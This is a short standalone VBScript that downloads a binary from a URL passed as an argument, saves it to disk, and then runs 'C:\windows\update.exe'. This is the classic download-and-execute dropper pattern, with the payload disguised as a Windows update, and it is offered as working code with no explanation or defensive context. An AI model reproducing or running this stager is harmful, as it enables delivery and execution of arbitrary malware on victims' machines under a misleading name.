Const adTypeBinary = 1  
Const adSaveCreateOverWrite = 2  
Dim BinaryStream  
Set BinaryStream = CreateObject("ADODB.Stream")  
BinaryStream.Type = adTypeBinary  
BinaryStream.Open  
BinaryStream.Write BinaryGetURL(Wscript.Arguments(0))  
BinaryStream.SaveToFile Wscript.Arguments(1), adSaveCreateOverWrite  
Function BinaryGetURL(URL)  
Dim Http  
Set Http = CreateObject("WinHttp.WinHttpRequest.5.1")  
Http.Open "GET", URL, False  
Http.Send  
BinaryGetURL = Http.ResponseBody  
End Function  
Set shell = CreateObject("WScript.Shell")  
shell.Run "C:\windows\update.exe"  
